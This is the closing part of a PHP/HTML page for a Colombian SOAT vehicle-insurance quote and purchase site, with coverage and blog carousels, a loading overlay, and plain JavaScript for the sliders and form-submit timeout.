        <img src="assets/img/amparo-fallecimiento.png" alt="Fallecimiento">
        <div class="content-item-module--content__item__wrapper_content--8a872">
          <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a">Fallecimiento</h2>
          <div class="content-item-module--content__item__wrapper_content__text--32547">
            <p>750 salarios mínimos diarios legales vigentes a los beneficiarios
               de la persona que fallezca.</p>
          </div>
        </div>
      </div>

      <div class="amparos-slide">
        <img src="assets/img/amparo-transporte.png" alt="Gastos de transporte">
        <div class="content-item-module--content__item__wrapper_content--8a872">
          <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a">Gastos de transporte</h2>
          <div class="content-item-module--content__item__wrapper_content__text--32547">
            <p>Hasta 8.77 UVT (Unidades de Valor Tributario) para transporte desde el sitio
               del accidente hasta un centro médico.</p>
          </div>
        </div>
      </div>

    </div>

    <div class="amparos-dots" id="amparosDots">
      <button class="amparos-dot is-active" data-goto="0" aria-label="Slide 1"></button>
      <button class="amparos-dot" data-goto="1" aria-label="Slide 2"></button>
      <button class="amparos-dot" data-goto="2" aria-label="Slide 3"></button>
      <button class="amparos-dot" data-goto="3" aria-label="Slide 4"></button>
    </div>

  </div>
</section>

<section class="content-blocks-module--content--9f321">
  <div class="content-blocks-module--content__block--4bf19">
    <h2 class="content-blocks-module--content__title--15357">Blog Mundial</h2>

    <div class="content-blocks-module--content__cards--e3958">

      <article class="card-blog-module--content__card--650f8">
        <figure class="card-blog-module--card__body--d1c55">
          <img class="safe-gatsby-image-module--safeImage--9bfbe card-blog-module--image--b6ae6 safe-gatsby-image-module--fitContain--74974"
               src="assets/img/Seccion_Seguro_Tercero_.png"
               width="1000" height="667" alt="blog-seguro-soat" title="blog-seguro-soat">
          <div class="card-blog-module--container__info--88c27">
            <h3 class="card-blog-module--content__subtitle--884aa">¿Ya conoces Seguro Tercero?</h3>
            <div class="markdown-html-module--markdown_html--48d1c card-blog-module--content__description--241d7">
              <p>El complemento del SOAT que llegó a respaldarte en los daños materiales
                 causados a terceros en un accidente de transito.</p>
            </div>
            <a class="card-blog-module--content__button--7c7a5" target="_blank" rel="noreferrer"
               href="https://segurotercero.com/?utm_source=soatmundial&utm_medium=referral">Conoce más</a>
          </div>
        </figure>
      </article>

      <article class="card-blog-module--content__card--650f8 card-blog-module--lightgray--a999e">
        <figure class="card-blog-module--card__body--d1c55">
          <img class="safe-gatsby-image-module--safeImage--9bfbe card-blog-module--image--b6ae6 safe-gatsby-image-module--fitContain--74974"
               src="assets/img/Secci_n_Tarifas_2023_1000x667_px.jpg"
               width="1000" height="575" alt="blog-beneficios-soat" title="blog-beneficios-soat">
          <div class="card-blog-module--container__info--88c27">
            <h3 class="card-blog-module--content__subtitle--884aa">¿Cuál es el valor de mi SOAT 2026?</h3>
            <div class="markdown-html-module--markdown_html--48d1c card-blog-module--content__description--241d7">
              <p>Bueno, eso depende del tipo de nave que tengas. Puedes conocer el valor
                 de tu SOAT en nuestra sección de tarifas.</p>
            </div>
            <a class="card-blog-module--content__button--7c7a5" target="_blank" rel="noreferrer"
               href="https://soatmundial.com.co/tarifas-soat/">Conoce más</a>
          </div>
        </figure>
      </article>

      <article class="card-blog-module--content__card--650f8">
        <figure class="card-blog-module--card__body--d1c55">
          <img class="safe-gatsby-image-module--safeImage--9bfbe card-blog-module--image--b6ae6 safe-gatsby-image-module--fitContain--74974"
               src="assets/img/Secci_n_Beneficios_Mundial_1000x667_px.jpg"
               width="1000" height="667" alt="blog-descuento-soat" title="blog-descuento-soat">
          <div class="card-blog-module--container__info--88c27">
            <h3 class="card-blog-module--content__subtitle--884aa">Renueva tu SOAT</h3>
            <div class="markdown-html-module--markdown_html--48d1c card-blog-module--content__description--241d7">
              <p>Pensando en tu seguridad, creamos la forma más rápida, fácil y segura
                 de renovar tu SOAT online.</p>
            </div>
            <a class="card-blog-module--content__button--7c7a5" target="_blank" rel="noreferrer"
               href="https://soatmundial.com.co/renovacionsoat/">Conoce más</a>
          </div>
        </figure>
      </article>

    </div>
  </div>
</section>

</main>

<?php include __DIR__ . '/includes/footer.php'; ?>

</div>
</div>

<!-- ================================================================
     OVERLAY DE CARGA (mientras consulta la API)
     ================================================================ -->
<div class="soat-loading-overlay" id="soatLoading" aria-hidden="true" role="status">
  <div class="soat-loading-overlay__contenido">
    <img class="soat-loading-overlay__logo"
         src="assets/img/loading.svg"
         alt="Cargando">
    <p class="soat-loading-overlay__texto">Consultando los datos de tu vehículo...</p>
    <p class="soat-loading-overlay__subtexto">
      Esto puede tardar hasta 90 segundos.<br>
      Por favor, no cierres ni recargues la página.
    </p>
  </div>
</div>

<script>
(function () {
    'use strict';

    /* ---------- CARRUSEL DEL HERO ---------- */
    var heroSlides   = document.querySelectorAll('.hero-slide');
    var heroDotsWrap = document.getElementById('heroDotsDesktop');
    var heroDots     = heroDotsWrap ? heroDotsWrap.querySelectorAll('button') : [];
    var heroBgImg    = document.getElementById('heroBgImg');
    var heroIndex    = 0;
    var heroTimer    = null;
    var HERO_DELAY   = 5000;

    var heroImages = [
        'assets/img/beanbag.png',
        'assets/img/hero-cdt.png',
        'assets/img/hero-breb.png',
        'assets/img/hero-seguridad.png',
        'assets/img/hero-mantenimiento.png'
    ];

    function showHero(i) {
        if (!heroSlides.length) return;
        heroIndex = (i + heroSlides.length) % heroSlides.length;
        heroSlides.forEach(function (s, k) {
            s.classList.toggle('is-active', k === heroIndex);
        });
        heroDots.forEach(function (d, k) {
            d.className = (k === heroIndex)
                ? 'banner-module--bannerRemarketing__buttons__button_active--75530'
                : 'banner-module--bannerRemarketing__buttons__button--1eea2';
        });
        if (heroBgImg && heroImages[heroIndex]) {
            heroBgImg.src = heroImages[heroIndex];
        }
    }
    function nextHero() { showHero(heroIndex + 1); }
    function prevHero() { showHero(heroIndex - 1); }
    function startHero() {
        stopHero();
        if (heroSlides.length > 1) heroTimer = setInterval(nextHero, HERO_DELAY);
    }
    function stopHero() {
        if (heroTimer) { clearInterval(heroTimer); heroTimer = null; }
    }

    heroDots.forEach(function (d) {
        d.addEventListener('click', function () {
            showHero(parseInt(d.getAttribute('data-goto'), 10));
            startHero();
        });
    });

    var heroPrevMobile = document.getElementById('heroPrevMobile');
    var heroNextMobile = document.getElementById('heroNextMobile');
    if (heroPrevMobile) heroPrevMobile.addEventListener('click', function (e) {
        e.preventDefault(); prevHero(); startHero();
    });
    if (heroNextMobile) heroNextMobile.addEventListener('click', function (e) {
        e.preventDefault(); nextHero(); startHero();
    });

    var heroSection = document.getElementById('heroCarousel');
    if (heroSection) {
        heroSection.addEventListener('mouseenter', stopHero);
        heroSection.addEventListener('mouseleave', startHero);
    }
    startHero();

    /* ---------- CARRUSEL DE AMPAROS ---------- */
    var track        = document.getElementById('amparosTrack');
    var prevBtn      = document.getElementById('amparosPrev');
    var nextBtn      = document.getElementById('amparosNext');
    var amparosDots  = document.querySelectorAll('.amparos-dot');
    var amparosTotal = track ? track.children.length : 0;
    var amparosIdx   = 0;
    var amparosTimer = null;
    var AMPAROS_DELAY = 3000;

    function showAmparo(i) {
        if (!track || !amparosTotal) return;
        amparosIdx = (i + amparosTotal) % amparosTotal;
        track.style.transform = 'translateX(-' + (amparosIdx * 100) + '%)';
        amparosDots.forEach(function (d, k) {
            d.classList.toggle('is-active', k === amparosIdx);
        });
    }
    function nextAmparo() { showAmparo(amparosIdx + 1); }
    function startAmparos() {
        stopAmparos();
        if (amparosTotal > 1) amparosTimer = setInterval(nextAmparo, AMPAROS_DELAY);
    }
    function stopAmparos() {
        if (amparosTimer) { clearInterval(amparosTimer); amparosTimer = null; }
    }

    if (prevBtn) prevBtn.addEventListener('click', function (e) {
        e.preventDefault(); e.stopPropagation();
        showAmparo(amparosIdx - 1); startAmparos();
    });
    if (nextBtn) nextBtn.addEventListener('click', function (e) {
        e.preventDefault(); e.stopPropagation();
        showAmparo(amparosIdx + 1); startAmparos();
    });
    amparosDots.forEach(function (d) {
        d.addEventListener('click', function () {
            showAmparo(parseInt(d.getAttribute('data-goto'), 10)); startAmparos();
        });
    });

    var slider = document.getElementById('amparosSlider');
    if (slider) {
        slider.addEventListener('mouseenter', stopAmparos);
        slider.addEventListener('mouseleave', startAmparos);
    }
    startAmparos();

    /* ---------- SCROLL AL MENSAJE DE ERRORES ---------- */
    var msgErrores = document.getElementById('mensaje-errores');
    if (msgErrores) {
        msgErrores.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    /* ---------- MOSTRAR OVERLAY AL ENVIAR EL FORMULARIO ---------- */
    var formCotizar = document.getElementById('form-cotizar');
    var soatLoading = document.getElementById('soatLoading');

    if (formCotizar && soatLoading) {
        formCotizar.addEventListener('submit', function () {
            soatLoading.classList.add('is-visible');
            soatLoading.setAttribute('aria-hidden', 'false');
            document.body.style.overflow = 'hidden';

            var btn = formCotizar.querySelector('button[type="submit"]');
            if (btn) {
                btn.disabled = true;
                btn.textContent = 'Consultando...';
            }

            window.soatTimeout = setTimeout(function () {
                soatLoading.classList.remove('is-visible');
                soatLoading.setAttribute('aria-hidden', 'true');
                document.body.style.overflow = '';
                alert('La consulta tardó demasiado. Revisa tu conexión e intenta de nuevo.');
                if (btn) {
                    btn.disabled = false;
                    btn.textContent = 'Compra tu SOAT';
                }
            }, 60000);
        });
    }

    window.addEventListener('beforeunload', function () {
        if (window.soatTimeout) clearTimeout(window.soatTimeout);
    });

})();
</script>

</body>
</html>